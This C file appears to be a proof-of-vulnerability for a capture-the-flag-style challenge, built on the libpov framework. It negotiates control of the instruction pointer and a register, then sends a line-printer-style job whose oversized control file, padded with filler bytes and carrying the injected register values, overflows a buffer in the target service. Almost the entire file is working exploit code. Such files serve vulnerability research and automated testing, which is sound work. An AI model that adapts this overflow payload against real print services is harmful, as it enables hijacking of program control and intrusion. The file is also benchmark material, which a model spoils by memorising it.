#include <libpov.h>

int main(void) {
   negotiate_type1(0xfefefefe, 0xfefefefe, 1);

   unsigned int job_id = 999, idx = 0, eip_len = 4, payload_len = 0;
   unsigned char nl[] = "\n";
   unsigned char ctrl[1024];
   unsigned char *payload = NULL;

   transmit_all(1, "\x02""DEFAULT\n", 9);

   memcpy(&ctrl[idx], "H192.168.0.1\nProot\nNTest\nT", 26);
   idx += 26;
   memset(&ctrl[idx], 'B', 88);
   idx += 88;

   payload = append_buf(payload, &payload_len, ctrl, idx);
   payload = append_var("TYPE1_IP", payload, &payload_len);
   payload = append_var("TYPE1_REG", payload, &payload_len);
   for (int i = 0; i < 8; i++)
       payload[payload_len - 8 + i] |= 0x01;

   idx = 1023 - payload_len;
   memset(ctrl, 'A', idx);
   ctrl[idx++] = '\n';

   payload = append_buf(payload, &payload_len, ctrl, idx);
   payload = append_buf(payload, &payload_len, nl, 1);

   transmit_all(1, "\x02""1024 cfA999192.168.0.1\n", 24);
   transmit_all(1, payload, payload_len);
   free(payload); payload = NULL; payload_len = 0;

   transmit_all(1, "\x03""12 dfA999192.168.0.1\n", 22);
   transmit_all(1, "This is data\x00\x00\n", 15);

   transmit_all(1, "\x03""DEFAULT \n", 10);

   return 0;
}
